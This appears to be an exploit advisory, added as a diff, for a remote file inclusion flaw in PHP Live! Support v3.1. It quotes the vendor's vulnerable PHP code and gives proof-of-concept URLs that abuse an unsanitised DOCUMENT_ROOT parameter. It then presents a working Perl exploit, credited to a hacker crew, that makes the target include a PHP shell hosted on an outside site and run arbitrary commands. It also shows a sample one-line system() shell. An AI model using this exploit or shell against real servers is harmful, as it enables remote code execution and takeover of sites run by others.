@@ -1,0 +1,326 @@
+#####
+# [?] Homepage	: http://www.indonesiancoder.com
+# [?] Location 	: INDONESIA
+# [?] Vendor 	: http://www.phplivesupport.com/
+# [?] Describe	: PHP Live! Support v3.1 (c) by OSI Codes Inc.                                                      
+# Chat with your website visitors with PHP Live!
+#
+#    * Provide Live Support on your Website
+#    * Increase your Sales
+#    * Increase Customer Satisfaction
+#    * Decrease your phone/operational costs
+# [?] Usage	:
+# perl tux.pl <target> <weapon url> cmd
+# perl tux.pl http://server/path/ http://www.indonesiancoder.org/shell.txt cmd
+# Weapon example: <?php system($_GET['cmd']); ?>
+#####
+<!--more-->
+# [-] Bugs in
+
+[+] index.php
+<pre lang="php">
+<?php
+    /*******************************************************
+    * COPYRIGHT OSI CODES - PHP Live!
+    *******************************************************/
+    session_start() ;
+    $l = "" ;
+    // try to get cookie value first
+    if ( isset( $_COOKIE['COOKIE_PHPLIVE_SITE'] ) ) { $l = $_COOKIE['COOKIE_PHPLIVE_SITE'] ; }
+    if ( isset( $_GET['l'] ) ) { $l = $_GET['l'] ; }
+    if ( isset( $_POST['l'] ) ) { $l = $_POST['l'] ; }
+
+    if ( !file_exists( "./web/conf-init.php" ) )
+    {
+        HEADER( "location: setup/index.php" ) ;
+        exit ;
+    }
+    
+    include_once( "./API/Util_Dir.php" ) ;
+    if ( Util_DIR_CheckDir( ".", $l ) )
+        include_once("./web/$l/$l-conf-init.php") ;
+    include_once("./web/conf-init.php") ;
+    $DOCUMENT_ROOT = realpath( preg_replace( "/http:/", "", $DOCUMENT_ROOT ) ) ;
+    include_once("$DOCUMENT_ROOT/API/Util_Error.php") ;
+    include_once("$DOCUMENT_ROOT/system.php") ;
+    include_once("$DOCUMENT_ROOT/lang_packs/$LANG_PACK.php") ;
+    include_once("$DOCUMENT_ROOT/web/VERSION_KEEP.php") ;
+    include_once("$DOCUMENT_ROOT/API/Util_CleanFiles.php") ;
+    include_once("$DOCUMENT_ROOT/API/sql.php" ) ;
+    include_once("$DOCUMENT_ROOT/API/Users/get.php") ;
+    include_once("$DOCUMENT_ROOT/API/Users/update.php") ;
+    include_once("$DOCUMENT_ROOT/API/Chat/remove.php") ;
+    include_once("$DOCUMENT_ROOT/API/ASP/get.php") ;
+
+    // initialize
+    $action = $error = $sid = $site = $remember = "" ;
+    $sound_file = "cellular.wav" ;
+    $isadmin = $winapp = $autologin = $wflag = $closewin = 0 ;
+
+    if ( !isset( $_SESSION['session_admin'] ) )
+    {
+        session_register( "session_admin" ) ;
+        $session_admin = ARRAY() ;
+        $_SESSION['session_admin'] = ARRAY() ;
+    }
+
+    // check to see if the site login is passes.  if not, then let's see how many
+    // sites are in the asp model.  if only ONE, then default to that one.
+    $total_sites = AdminASP_get_TotalUsers( $dbh ) ;
+    if ( $total_sites == 1 )
+    {
+        $site = AdminASP_get_AllUsers( $dbh, 0, 1 ) ;
+        $l = $site[0]['login'] ;
+    }
+
+    if ( isset( $LOGO ) && file_exists( "$DOCUMENT_ROOT/web/$l/$LOGO" ) && $LOGO )
+        $logo = "$BASE_URL/web/$l/$LOGO" ;
+    else if ( file_exists( "$DOCUMENT_ROOT/web/$LOGO_ASP" ) && $LOGO_ASP )
+        $logo = "$BASE_URL/web/$LOGO_ASP" ;
+    else
+        $logo = "$BASE_URL/images/logo.gif" ;
+
+    // get variables
+    if ( isset( $_POST['action'] ) ) { $action = $_POST['action'] ; }
+    if ( isset( $_GET['action'] ) ) { $action = $_GET['action'] ; }
+    if ( isset( $_POST['winapp'] ) ) { $winapp = $_POST['winapp'] ; }
+    if ( isset( $_GET['winapp'] ) ) { $winapp = $_GET['winapp'] ; }
+    if ( isset( $_GET['wflag'] ) ) { $wflag = $_GET['wflag'] ; }
+    if ( isset( $_GET['closewin'] ) && ( $_GET['closewin'] != "undefined" ) ) { $closewin = $_GET['closewin'] ; }
+
+    // conditions
+    if ( ( isset( $_COOKIE['COOKIE_PHPLIVE_LOGIN'] ) && isset( $_COOKIE['COOKIE_PHPLIVE_PASSWORD'] ) && isset( $_COOKIE['COOKIE_PHPLIVE_SITE'] ) ) && !$action )
+        $autologin = 1 ;
+
+    if ( $action == "login" )
+    {
+        if ( $l )
+            $site = $l ;
+        else
+            $site = $_POST['site'] ;
+
+        $aspinfo = AdminASP_get_ASPInfoByASPLogin( $dbh, $site ) ;
+        $admin = AdminUsers_get_UserInfoByLoginPass( $dbh, $_POST['login'], $_POST['password'], $aspinfo['aspID'] ) ;
+
+        if ( !$aspinfo['active_status'] )
+            $error = "Servi?o est? inativo. Entre em contato com o administrador para obter detalhes setup." ;
+        else
+        {
+            if ( $admin['userID'] && ( $admin['aspID'] == $aspinfo['aspID'] ) )
+            {
+                CleanFiles_util_CleanChatSessionFiles() ;
+
+                // set $sid.  $sid is used to keep track of this admin user.  $sid allows
+                // so a user can log into several admin departments on same computer.  it is
+                // passed everywhere the admin goes.
+                $sid = time() ;
+
+                $departments = AdminUsers_get_UserDepartments( $dbh, $admin['userID'] ) ;
+                $dept_string = "" ;
+                for ( $c = 0; $c < count( $departments ); ++$c )
+                {
+                    $the_department = $departments[$c] ;
+                    $dept_string .= "deptID = $the_department[deptID] OR " ;
+                }
+                $dept_string .= "deptID = 0" ;
+
+                $_SESSION['session_admin'][$sid] = ARRAY() ;
+                $_SESSION['session_admin'][$sid]['dept_string'] = $dept_string ;
+                $_SESSION['session_admin'][$sid]['admin_id'] = $admin['userID'] ;
+                $_SESSION['session_admin'][$sid]['requests'] = 0 ;
+                $_SESSION['session_admin'][$sid]['aspID'] = $aspinfo['aspID'] ;
+                $_SESSION['session_admin'][$sid]['asp_login'] = $aspinfo['login'] ;
+                $_SESSION['session_admin'][$sid]['active_footprints'] = 0 ;
+                $_SESSION['session_admin'][$sid]['winapp'] = "$winapp" ;
+                $_SESSION['session_admin'][$sid]['close_timer'] = 0 ;
+                $_SESSION['session_admin'][$sid]['traffic_monitor'] = 0 ;
+                $_SESSION['session_admin'][$sid]['available_status'] = 1 ;
+                $_SESSION['session_admin'][$sid]['sound'] = "on" ;
+                $_SESSION['session_admin'][$sid]['request_ids'] = "" ;
+                $_SESSION['session_admin'][$sid]['traffic_timer'] = $admin['console_refresh'] ;
+                $isadmin = 1 ;
+
+                // check to see if they want to be remembered... if so, just set cookie.
+                // let's set it for 1 month for now.
+                $cookie_lifespan = time() + 60*60*24*30 ;
+                if ( isset( $_POST['remember'] ) )
+                {
+                    setcookie( "COOKIE_PHPLIVE_LOGIN", $_POST['login'], $cookie_lifespan ) ;
+                    setcookie( "COOKIE_PHPLIVE_PASSWORD", $_POST['password'], $cookie_lifespan ) ;
+                    setcookie( "COOKIE_PHPLIVE_SITE", $aspinfo['login'], $cookie_lifespan ) ;
+                }
+            }
+            else
+            {
+                // reset cookie if cookies are set
+                if ( isset( $_COOKIE['COOKIE_PHPLIVE_LOGIN'] ) && isset( $_COOKIE['COOKIE_PHPLIVE_PASSWORD'] ) )
+                {
+                    setcookie( "COOKIE_PHPLIVE_LOGIN", "", -1 ) ;
+                    setcookie( "COOKIE_PHPLIVE_PASSWORD", "", -1 ) ;
+                    setcookie( "COOKIE_PHPLIVE_SITE", "", -1 ) ;
+                }
+                $error = "Falha de Login.  Nota: sua senha ? (CaSE senSiTiVE)." ;
+            }
+        }
+    }
+    else if ( $action == "logout" )
+    {
+        if ( isset( $_COOKIE['COOKIE_PHPLIVE_LOGIN'] ) && isset( $_COOKIE['COOKIE_PHPLIVE_PASSWORD'] ) && !$wflag )
+        {
+            setcookie( "COOKIE_PHPLIVE_LOGIN", "", -1 ) ;
+            setcookie( "COOKIE_PHPLIVE_PASSWORD", "", -1 ) ;
+            setcookie( "COOKIE_PHPLIVE_SITE", "", -1 ) ;
+        }
+        $sid = $_GET['sid'] ;
+        $l = $_SESSION['session_admin'][$sid]['asp_login'] ;
+        AdminUsers_update_Status( $dbh, $_SESSION['session_admin'][$sid]['admin_id'], 0 ) ;
+        AdminUsers_update_UserValue( $dbh, $_SESSION['session_admin'][$sid]['admin_id'], "last_active_time", $admin_idle - 300 ) ;
+        $_SESSION['session_admin'] = Array() ;
+        HEADER( "location: index.php?wflag=$wflag&l=$l&winapp=$winapp&closewin=$closewin" ) ;
+        exit ;
+    }
+    else
+    {
+        // do the cleaning of the chat database of old requests and sessions.
+        ServiceChat_remove_CleanChatSessionList( $dbh ) ;
+        ServiceChat_remove_CleanChatSessions( $dbh ) ;
+        ServiceChat_remove_CleanChatRequests( $dbh ) ;
+    }
+?>
+</pre>
+
+[+] chat.php
+<pre lang="php">
+<?php
+    /*******************************************************
+    * COPYRIGHT OSI CODES - PHP Live!
+    *******************************************************/
+    session_start() ;
+    $session_chat = $_SESSION['session_chat'] ;
+    $sid = ( isset( $_GET['sid'] ) ) ? $_GET['sid'] : "" ;
+    $requestid = ( isset( $_GET['requestid'] ) ) ? $_GET['requestid'] : "" ;
+    $sessionid = ( isset( $_GET['sessionid'] ) ) ? $_GET['sessionid'] : "" ;
+    $userid = ( isset( $_GET['userid'] ) ) ? $_GET['userid'] : "" ;
+    $action = ( isset( $_GET['action'] ) ) ? $_GET['action'] : "" ;
+    if ( !file_exists( "web/".$session_chat[$sid]['asp_login']."/".$session_chat[$sid]['asp_login']."-conf-init.php" ) || !file_exists( "web/conf-init.php" ) )
+    {
+        print "<font color=\"#FF0000\">[Configuration Error: config files not found! -$sid] Exiting...</font>" ;
+        exit ;
+    }
+    include_once("./web/conf-init.php") ;
+    $DOCUMENT_ROOT = realpath( preg_replace( "/http:/", "", $DOCUMENT_ROOT ) ) ;
+    include_once("$DOCUMENT_ROOT/web/".$session_chat[$sid]['asp_login']."/".$session_chat[$sid]['asp_login']."-conf-init.php") ;
+    include_once("$DOCUMENT_ROOT/system.php") ;
+    include_once("$DOCUMENT_ROOT/lang_packs/$LANG_PACK.php") ;
+    include_once("$DOCUMENT_ROOT/API/sql.php") ;
+    include_once("$DOCUMENT_ROOT/API/Chat/update.php") ;
+
+
+    // set frame row properties depending if admin or regular request
+    $frame_row_properties = "*,100%" ;
+    if ( $session_chat[$sid]['isadmin'] && $session_chat[$sid]['deptid'] )
+        $frame_row_properties = "*,100%" ;
+    // let's start the poll time
+    $_SESSION['session_chat'][$sid]['admin_poll_time'] = time() ;
+    $window_title = preg_replace( "/<(.*)>/", "", $session_chat[$sid]['visitor_name'] ) .": Support Request" ;
+?>
+</pre>
+
+[+] help.php
+<pre lang="php">
+<?php
+    /*******************************************************
+    * COPYRIGHT OSI CODES - PHP Live!
+    *******************************************************/
+    include_once("./web/conf-init.php");
+    $DOCUMENT_ROOT = realpath( preg_replace( "/http:/", "", $DOCUMENT_ROOT ) ) ;
+    include_once("$DOCUMENT_ROOT/system.php") ;
+    include_once("$DOCUMENT_ROOT/lang_packs/$LANG_PACK.php") ;
+    include_once("$DOCUMENT_ROOT/web/VERSION_KEEP.php") ;
+    include_once("$DOCUMENT_ROOT/API/sql.php") ;
+
+    // initialize
+    $action = "" ;
+
+    if ( preg_match( "/(MSIE)|(Gecko)/", $_SERVER['HTTP_USER_AGENT'] ) )
+        $text_width = "12" ;
+    else
+        $text_width = "9" ;
+
+    $success = 0 ;
+    // update all admins status to not available if they have been idle
+
+    // get variables
+    if ( isset( $_POST['action'] ) ) { $action = $_POST['action'] ; }
+    if ( isset( $_GET['action'] ) ) { $action = $_GET['action'] ; }
+?>
+</pre>
+
+
+[-] PoC
+
+http://server/path/index.php?DOCUMENT_ROOT=
+http://server/path/chat.php?DOCUMENT_ROOT=
+http://server/path/help.php?DOCUMENT_ROOT=
+
+[-] eXpL0!t c0des
+
+<pre lang="perl">
+#!/usr/bin/perl
+
+use HTTP::Request;
+use LWP::UserAgent;
+$RoNz = $ARGV[0];
+$Pathloader = $ARGV[1];
+$Contrex = $ARGV[2];
+if($RoNz!~/http:\/\// || $Pathloader!~/http:\/\// || !$Contrex){usage()}
+head();
+sub head()
+ {
+ print "[o]============================================================================[o]\r\n";
+ print " |	       PHP Live! Support v3.1 Multiple Remote File Include	   	|\r\n";
+ print "[o]============================================================================[o]\r\n";
+ }
+while()
+{
+      print "[w00t] \$";
+while(<STDIN>)
+      {
+              $kaMtiEz=$_;
+              chomp($kaMtiEz);
+$arianom = LWP::UserAgent->new() or die;
+$tiw0L = HTTP::Request->new(GET =>$RoNz.'help.php?DOCUMENT_ROOT='.$Pathloader.'?&'.$Contrex.'='.$kaMtiEz)or die "\nCould Not connect\n";
+$abah_benu = $arianom->request($tiw0L);
+$tukulesto = $abah_benu->content;
+$tukulesto =~ tr/[\n]/[?]/;
+if (!$kaMtiEz) {print "\nPlease Enter a Command\n\n"; $tukulesto ="";}
+elsif ($tukulesto =~/failed to open stream: HTTP request denied!/ || $tukulesto =~/: Cannot execute a blank command in /)
+      {print "\nCann't Connect to cmd Host or Invalid Command\n";exit}
+elsif ($tukulesto =~/^<br.\/>.<b>Fatal.error/) {print "\nInvalid Command or No Return\n\n"}
+if($tukulesto =~ /(.*)/)
+{
+      $finreturn = $1;
+      $finreturn=~ tr/[?]/[\n]/;
+      print "\r\n$finreturn\n\r";
+      last;
+}
+else {print "[w00t] \$";}}}last;
+sub usage()
+ {
+ head();
+ print " | Usage:  perl tux.pl <target> <weapon url> <cmd>				|\r\n";
+ print " | <Site> - Full path to execute ex: http://127.0.0.1/path/			|\r\n";
+ print " | <Weapon url> - Path to Shell e.g http://www.indonesiancoder.org/shell.txt	|\r\n";
+ print " | <cmd> - Command variable used in php shell					|\r\n";
+ print "[o]============================================================================[o]\r\n";
+ print " | 	IndonesianCoder Team | KILL-9 CREW | ServerIsDown | AntiSecurity.org    |\r\n";
+ print " |   kaMtiEz, M3NW5, arianom, tiw0L, Pathloader, abah_benu, VycOd, Gh4mb4S      |\r\n";
+ print " | M364TR0N, TUCKER, Ian Petrucii, kecemplungkalen, NoGe, bh4nd55, MainHack.Net |\r\n";
+ print " |  Jack-, Contrex, yadoy666, Ronz, noname, s4va, gonzhack, cyb3r_tron, saint   |\r\n";
+ print " |    Awan Bejat, Plaque, rey_cute, BennyCooL, SurabayaHackerLink Team and YOU! |\r\n";
+ print "[o]============================================================================[o]\r\n";
+ print " |	http://www.IndonesianCoder.org	   |	http://www.AntiSecRadio.fm 	|\r\n";
+ print "[o]============================================================================[o]\r\n";
+ exit();
+ }
+</pre>
